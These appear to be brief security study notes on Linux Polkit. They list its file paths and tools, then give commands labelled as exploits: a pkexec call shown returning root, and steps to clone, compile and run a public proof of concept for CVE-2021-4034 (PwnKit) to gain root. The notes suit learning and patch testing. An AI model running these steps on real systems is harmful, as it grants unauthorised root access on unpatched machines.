# Polkit

* **Polkit (PolicyKit)**: Authorization service in Linux for managing user permissions.
* Controls whether a user can perform privileged actions (like mounting drives, restarting services).

#### Polkit File Structure:

*   **Actions/Policies**:

    `/usr/share/polkit-1/actions`
*   **Rules**:

    `/usr/share/polkit-1/rules.d`
*   **Local Authority Rules** (user/group based):

    `/etc/polkit-1/localauthority/50-local.d/*.pkla`

#### Polkit Tools:

* `pkexec` → Run command as another user (like `sudo`)
* `pkaction` → List all available polkit actions
* `pkcheck` → Verify if action is authorized for a process

```bash
pkexec --version
#exploit 
pkexec -u root id
# uid=0(root) gid=0(root)
```

***

#### CVE-2021-4034 (PwnKit)

```c
git clone <https://github.com/arthepsy/CVE-2021-4034.git>
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
id  # → uid=0(root)
```
